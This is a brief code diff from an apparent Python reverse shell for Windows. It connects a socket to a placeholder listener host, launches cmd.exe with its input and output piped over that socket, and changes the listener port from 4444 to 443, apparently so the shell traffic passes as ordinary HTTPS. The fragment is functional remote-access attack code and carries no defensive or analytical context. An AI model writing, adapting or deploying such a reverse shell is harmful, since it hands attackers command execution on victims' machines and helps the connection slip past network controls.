@@ -14,7 +14,7 @@ def p2s(s, p):
         s.send(p.stdout.read(1))
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("listener-URL", 4444))
+s.connect(("listener-URL", 443))
 
 p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
